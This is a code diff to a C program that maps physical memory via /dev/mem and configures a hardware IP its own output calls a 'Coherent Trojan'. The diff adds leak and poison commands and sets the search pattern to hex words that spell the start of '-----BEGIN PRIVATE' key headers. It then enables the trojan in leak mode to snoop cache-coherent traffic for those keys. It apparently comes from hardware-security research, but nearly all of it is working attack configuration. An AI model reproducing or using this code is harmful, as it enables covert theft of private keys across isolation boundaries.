@@ -27,6 +27,9 @@
 #define ADTEN_pos   19
 #define PDTEN_pos   20
 #define MONEN_pos   21
+#define CMD_pos     22
+    #define CMD_LEAK        0
+    #define CMD_POISON      1
 
 // Status Reg bits
 #define OSH_END_pos 0
@@ -89,6 +92,7 @@ int main() {
     static unsigned int *PATTERN13;          
     static unsigned int *PATTERN14;          
     static unsigned int *PATTERN15; 
+    static unsigned int *PATTERN_SIZE; 
 
     // Open /dev/mem to access physical memory
     mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
@@ -153,6 +157,7 @@ int main() {
     PATTERN13 = map_base+45;
     PATTERN14 = map_base+46;
     PATTERN15 = map_base+47;
+    PATTERN_SIZE = map_base+48;
   
     // Cache line to write
     *DATA0   = 0xAAAAAAAA;
@@ -173,52 +178,37 @@ int main() {
     *DATA15  = 0x0000000F;
     
     // Pattern to search 
-    *PATTERN0  = 0xa9bd7bfd; 
-    *PATTERN1  = 0x910003fd; 
-    *PATTERN2  = 0xb90013ff; 
-    *PATTERN3  = 0x52800140; 
-    *PATTERN4  = 0xb9001be0; 
-    *PATTERN5  = 0xb9001fff; 
-    *PATTERN6  = 0x52a80000; 
-    *PATTERN7  = 0xb90023e0; 
-    *PATTERN8  = 0x52820041; 
-    *PATTERN9  = 0x72a00201; 
-    *PATTERN10 = 0x90000000; 
-    *PATTERN11 = 0x91376000; 
-    *PATTERN12 = 0x97ffff80; 
-    *PATTERN13 = 0xb90027e0; 
-    *PATTERN14 = 0xb94027e0; 
-    *PATTERN15 = 0x3100041f; 
+    *PATTERN0  = 0x2d2d2d2d; 
+    *PATTERN1  = 0x4745422d; 
+    *PATTERN2  = 0x50204e49; 
+    *PATTERN3  = 0x41564952; 
+    // *PATTERN4  = 0xb9001be0; 
+    // *PATTERN5  = 0xb9001fff; 
+    // *PATTERN6  = 0x52a80000; 
+    // *PATTERN7  = 0xb90023e0; 
+    // *PATTERN8  = 0x52820041; 
+    // *PATTERN9  = 0x72a00201; 
+    // *PATTERN10 = 0x90000000; 
+    // *PATTERN11 = 0x91376000; 
+    // *PATTERN12 = 0x97ffff80; 
+    // *PATTERN13 = 0xb90027e0; 
+    // *PATTERN14 = 0xb94027e0; 
+    // *PATTERN15 = 0x3100041f; 
 
-    // *PATTERN0  = 0xa9bd7bfd; // d54783c2
-    // *PATTERN1  = 0x910003fd; // dcd5db54
-    // *PATTERN2  = 0xb90013ff; // bbaf7e47
-    // *PATTERN3  = 0x52800140; // fe16863c
-    // *PATTERN4  = 0xb9001be0; // d206ceac
-    // *PATTERN5  = 0xb9001fff; // d260d0b8
-    // *PATTERN6  = 0x52a80000; // f65b9c92
-    // *PATTERN7  = 0xb90023e0; // cd197260
-    // *PATTERN8  = 0x52820041; // fcb01399
-    // *PATTERN9  = 0x72a00201; // 1443e896
-    // *PATTERN10 = 0x90000000; // 893d8de5
-    // *PATTERN11 = 0x91376000; // 1cd9b232
-    // *PATTERN12 = 0x97ffff80; // c8772659
-    // *PATTERN13 = 0xb90027e0; // 1ec5cf46
-    // *PATTERN14 = 0xb94027e0; // ff78efa1
-    // *PATTERN15 = 0x3100041f; // eb624e0d
+    *PATTERN_SIZE = 4;
 
     // Address Filter
     // *base_addr  = 0x03801600; 
-    *base_addr  = 0x40000000; 
+    // *base_addr  = 0x40000000; 
     // *base_addr  = 0x20001580; // without bao
     // 0x20001600 // without bao
     // 0x03801600 // with bao
 
     // *base_addr  = 0x038016c0; // with bao
-    *mem_size   = 0x4;
+    // *mem_size   = 0x4;
 
     // Snoop Filter
-    *acsnoop = 0x1;
+    // *acsnoop = 0x1;
 
     // Target Address
     *awsnoop =  0b001;
@@ -228,19 +218,20 @@ int main() {
     *ctrl    =    (0b00001 << CRRESP_pos) 
                 // | (1 << ACFLT_pos) 
                 // | (1 << ADDRFLT_pos) 
+                | (CMD_LEAK << CMD_pos)
+                | (FUNC_PDT << FUNC_pos) 
                 | (1 << PDTEN_pos)               
                 | (1 << MONEN_pos)               
-                | (FUNC_PDT << FUNC_pos) 
-                | (1 << EN_pos);
+                | (1<< EN_pos);
 
     // Wait for the end of the reply
-    printf(" status = 0x%08x\n", *status);   
-    while(!*status);
-    printf(" status = 0x%08x\n", *status);   
-    while(*status);
-    for (size_t i = 0; i < 10000000; i++);   
-    printf(" ctrl = 0x%08x\n", *ctrl);   
+    // printf(" status = 0x%08x\n", *status);   
+    // while(!*status);
+    // printf(" status = 0x%08x\n", *status);   
+    // while(*status);
+    // printf(" ctrl = 0x%08x\n", *ctrl);   
     // *ctrl = 0; // Disable IP
+    printf(" Coherent Trojan Configured!\n");
 
     // Unmap memory and close /dev/mem
     munmap(map_base, 4096);
